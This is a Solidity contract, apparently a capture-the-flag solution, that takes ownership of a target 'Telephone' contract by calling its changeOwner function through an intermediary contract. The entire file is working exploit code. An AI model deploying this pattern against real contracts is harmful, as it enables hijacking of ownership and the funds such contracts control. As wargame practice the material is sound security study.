// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    address telephoneContractAddress;

    constructor(address _address) {
        telephoneContractAddress = _address;
    }

    function hackTelephone() public {
        TelephoneInterface(telephoneContractAddress).changeOwner(msg.sender);
    }
}
